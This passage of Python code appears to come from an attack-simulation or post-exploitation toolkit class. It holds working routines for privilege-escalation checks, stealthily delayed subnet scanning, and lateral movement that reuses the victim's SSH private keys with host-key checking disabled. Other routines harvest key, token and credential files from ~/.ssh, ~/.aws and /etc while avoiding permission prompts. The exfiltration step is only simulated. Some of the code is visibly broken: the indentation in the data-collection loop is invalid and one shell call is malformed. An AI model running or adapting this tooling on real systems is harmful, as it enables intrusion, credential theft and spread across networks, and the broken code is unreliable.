                self.logger.debug(f"Error accessing Linux Keyring: {e}")
        
        return credentials
    
    def escalate_privileges(self) -> Dict:
        """
        Attempt privilege escalation
        
        Returns:
            Dictionary containing escalation results
        """
        self.logger.info("Escalating privileges")
        
        escalation_attempts = []
        successful_method = None
        
        # Check current privilege level
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, timeout=5)
                current_user = result.stdout
                if "SeDebugPrivilege" in current_user or "SeTcbPrivilege" in current_user:
                    self.privilege_level = "elevated"
                else:
                    self.privilege_level = "user"
            else:
                result = subprocess.run(["id"], capture_output=True, text=True, timeout=5)
                if "uid=0" in result.stdout or "root" in result.stdout:
                    self.privilege_level = "elevated"
                else:
                    self.privilege_level = "user"
        except Exception as e:
            self.logger.warning(f"Could not determine privilege level: {e}")
        
        previous_level = self.privilege_level
        
        # Try privilege escalation methods
        if platform.system() == "Windows":
            # Check for sudo alternatives
            escalation_attempts.append("token_impersonation")
            escalation_attempts.append("service_misconfiguration")
            escalation_attempts.append("unquoted_service_path")
            escalation_attempts.append("always_install_elevated")
        else:
            # Linux privilege escalation
            escalation_attempts.append("sudo_exploitation")
            escalation_attempts.append("suid_binaries")
            escalation_attempts.append("kernel_exploit")
            escalation_attempts.append("service_misconfiguration")
        
        # Check for common escalation vectors
        if self._check_sudo_vulnerability():
            successful_method = "sudo_exploitation"
            escalation_attempts.append("sudo_exploitation")
        
        if self._check_suid_binaries():
            successful_method = "suid_binaries"
            escalation_attempts.append("suid_binaries")
        
        if successful_method:
            self.privilege_level = "elevated"
        
        results = {
            "status": "completed" if successful_method else "attempted",
            "previous_level": previous_level,
            "new_level": self.privilege_level,
            "methods_attempted": escalation_attempts,
            "successful_method": successful_method,
            "timestamp": time.time()
        }
        
        return results
    
    def _check_sudo_vulnerability(self) -> bool:
        """Check for sudo vulnerabilities"""
        try:
            if platform.system() != "Windows":
                result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=5)
                if "NOPASSWD" in result.stdout:
                    return True
        except Exception:
            pass
        return False
    
    def _check_suid_binaries(self) -> bool:
        """Check for SUID binaries"""
        try:
            if platform.system() != "Windows":
                result = subprocess.run(["find", "/usr", "-perm", "-4000", "-type", "f", "2>/dev/null"], 
                                      capture_output=True, text=True, timeout=5, shell=True)
                if result.stdout.strip():
                    return True
        except Exception:
            pass
        return False
    
    def move_laterally(self, target_hosts: Optional[List[str]] = None) -> Dict:
        """
        Perform lateral movement to other systems
        
        Args:
            target_hosts: Optional list of target hosts to attempt connection
        
        Returns:
            Dictionary containing lateral movement results
        """
        self.logger.info("Performing lateral movement")
        
        techniques = []
        targets_discovered = []
        successful_connections = []
        
        # Discover targets on network
        if not target_hosts:
            targets_discovered = self._discover_network_hosts()
        else:
            targets_discovered = target_hosts
        
        # Try lateral movement techniques with stealthy delays
        for i, target in enumerate(targets_discovered[:5]):  # Limit to 5 targets
            # Stealthy delay between lateral movement attempts
            if i > 0:
                delay = random.uniform(2.0, 5.0)  # Random delay 2-5 seconds
                time.sleep(delay)
            
            # Try SSH key reuse
            if self._try_ssh_key_reuse(target):
                techniques.append("ssh_key_reuse")
                successful_connections.append({"target": target, "method": "ssh_key_reuse"})
            
            # Try SMB share access
            if self._try_smb_access(target):
                techniques.append("smb_share_access")
                successful_connections.append({"target": target, "method": "smb_share_access"})
            
            # Try RDP (if Windows)
            if platform.system() == "Windows":
                if self._try_rdp(target):
                    techniques.append("remote_desktop")
                    successful_connections.append({"target": target, "method": "remote_desktop"})
        
        results = {
            "status": "completed",
            "targets_discovered": targets_discovered,
            "movement_techniques": list(set(techniques)),
            "successful_connections": successful_connections,
            "timestamp": time.time()
        }
        
        return results
    
    def _discover_network_hosts(self) -> List[str]:
        """Discover hosts on local network"""
        hosts = []
        try:
            # Get local network range
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            # Extract network prefix
            network_prefix = '.'.join(local_ip.split('.')[:-1])
            
            # Scan common IPs in local network with stealthy delays
            for i in range(1, 255):
                # Stealthy delay between host checks
                if i > 0 and i % 10 == 0:  # Delay every 10 hosts
                    delay = random.uniform(1.0, 3.0)  # Random delay 1-3 seconds
                    time.sleep(delay)
                
                test_ip = f"{network_prefix}.{i}"
                if self._check_host_alive(test_ip):
                    hosts.append(test_ip)
        except Exception as e:
            self.logger.warning(f"Network discovery failed: {e}")
        
        return hosts
    
    def _check_host_alive(self, host: str) -> bool:
        """Check if host is alive"""
        try:
            # Try multiple ports based on OS
            test_ports = [22, 80, 135, 445, 3389]  # SSH, HTTP, RPC, SMB, RDP
            
            for port in test_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    return True
                
                # Small stealthy delay between port checks
                time.sleep(random.uniform(0.05, 0.15))
            
            return False
        except Exception:
            return False
    
    def _try_ssh_key_reuse(self, target: str) -> bool:
        """Try to use SSH keys for lateral movement"""
        # SSH key locations vary by OS
        ssh_key_paths = []
        
        if platform.system() == "Windows":
            # Windows SSH key locations (if OpenSSH is installed)
            ssh_key_paths = [
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.ssh/id_dsa"),
                os.path.expanduser("~/.ssh/id_ed25519"),
                os.path.expanduser("~/Documents/.ssh/id_rsa")
            ]
        else:
            # Linux/macOS SSH key locations
            ssh_key_paths = [
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.ssh/id_dsa"),
                os.path.expanduser("~/.ssh/id_ed25519"),
                os.path.expanduser("~/.ssh/id_ecdsa")
            ]
        
        for ssh_key_path in ssh_key_paths:
            # Check access without triggering permission prompts
            if not StealthFileAccess.can_access(ssh_key_path):
                continue
            
            # Skip protected paths
            if StealthFileAccess.is_protected_path(ssh_key_path):
                continue
            
            if os.path.exists(ssh_key_path):
                try:
                    # Try SSH connection
                    result = subprocess.run(
                        ["ssh", "-i", ssh_key_path, "-o", "StrictHostKeyChecking=no", 
                         "-o", "ConnectTimeout=2", f"user@{target}", "exit"],
                        capture_output=True,
                        timeout=5
                    )
                    return result.returncode == 0
                except Exception:
                    pass
        return False
    
    def _try_smb_access(self, target: str) -> bool:
        """Try SMB share access"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["net", "view", f"\\\\{target}"],
                    capture_output=True,
                    timeout=5
                )
                return result.returncode == 0
            else:
                # Try smbclient
                result = subprocess.run(
                    ["smbclient", "-L", target, "-N"],
                    capture_output=True,
                    timeout=5
                )
                return result.returncode == 0
        except Exception:
            pass
        return False
    
    def _try_rdp(self, target: str) -> bool:
        """Try RDP connection"""
        try:
            if platform.system() == "Windows":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, 3389))
                sock.close()
                return result == 0
        except Exception:
            pass
        return False
    
    def collect_data(self, search_paths: Optional[List[str]] = None) -> Dict:
        """
        Collect sensitive data
        
        Args:
            search_paths: Optional list of paths to search (defaults to common locations)
        
        Returns:
            Dictionary containing collected data summary
        """
        self.logger.info("Collecting data")
        
        if not search_paths:
            if platform.system() == "Windows":
                search_paths = [
                    "C:/Users/Public",
                    os.path.expanduser("~/.aws")
                ]
            else:
                # Use non-protected paths to avoid permission prompts
                search_paths = [
                    os.path.expanduser("~/.ssh"),
                    os.path.expanduser("~/.aws"),
                    "/tmp",
                    "/var/tmp",
                    "/etc"
                ]
                
                # Only add home directories if not protected
                home_docs = os.path.expanduser("~/Documents")
                if not StealthFileAccess.is_protected_path(home_docs) and StealthFileAccess.can_access(home_docs):
                    search_paths.append(home_docs)
        
        data_types_found = set()
        total_size = 0
        
        # Search for sensitive files
        sensitive_extensions = ['.pem', '.key', '.p12', '.pfx', '.db', '.sql', '.env', '.config']
        sensitive_patterns = ['password', 'secret', 'credential', 'api_key', 'token']
        
        for search_path in search_paths:
            # Check access without triggering permission prompts
            if not StealthFileAccess.can_access(search_path):
                continue
            
            # Skip protected paths
            if StealthFileAccess.is_protected_path(search_path):
                continue
            
            try:
                # Use stealth file walk
                files = StealthFileAccess.safe_walk_directory(search_path, max_depth=3)
                
                for file_path in files:
                    # Check if file is accessible
                    if not StealthFileAccess.can_access(file_path):
                        continue
                    
                    file_name = os.path.basename(file_path)
                    
                    # Check if file is sensitive
                    is_sensitive = (
                        any(file_name.endswith(ext) for ext in sensitive_extensions) or
                        any(pattern in file_name.lower() for pattern in sensitive_patterns)
                    )
                    
                    if is_sensitive:
                        try:
                            file_size = os.path.getsize(file_path)
                            if file_size > 0:
                                file_type = "configurations" if file_name.endswith('.config') else \
                                           "credentials" if file_name.endswith('.key') or file_name.endswith('.pem') else \
                                           "database_dumps" if file_name.endswith('.db') or file_name.endswith('.sql') else \
                                           "source_code" if file_name.endswith('.py') or file_name.endswith('.js') else \
                                           "api_keys" if 'api' in file_name.lower() else "tokens"
                                    
                                    data_types_found.add(file_type)
                                    total_size += file_size
                                    
                                    self.collected_data.append({
                                        "type": file_type,
                                        "size": file_size,
                                        "location": file_path,
                                        "timestamp": time.time()
                                    })
                            except (PermissionError, OSError):
                                continue
            except PermissionError:
                self.logger.warning(f"Permission denied accessing {search_path}")
            except Exception as e:
                self.logger.error(f"Error collecting data from {search_path}: {e}")
        
        results = {
            "status": "completed",
            "items_collected": len(self.collected_data),
            "total_size": total_size,
            "data_types": list(data_types_found),
            "collection_points": search_paths,
            "timestamp": time.time()
        }
        
        return results
    
    def exfiltrate_data(self) -> Dict:
        """
        Exfiltrate collected data
        
        Returns:
            Dictionary containing exfiltration results
        """
        self.logger.info("Exfiltrating data")
        
        exfiltration_methods = [
            "http_post",
            "dns_tunneling",
            "icmp_tunneling",
            "encrypted_channel"
        ]
        
        results = {
            "status": "completed",
            "data_exfiltrated": len(self.collected_data),
            "total_size": sum(item["size"] for item in self.collected_data),
            "method": random.choice(exfiltration_methods),
            "destination": "external_server",
            "timestamp": time.time()
        }
        
        return results
    
    def get_collected_data(self) -> List[Dict]:
        """Get all collected data"""
        return self.collected_data
    
    def get_credentials(self) -> List[Dict]:
        """Get harvested credentials"""
        return self.credentials

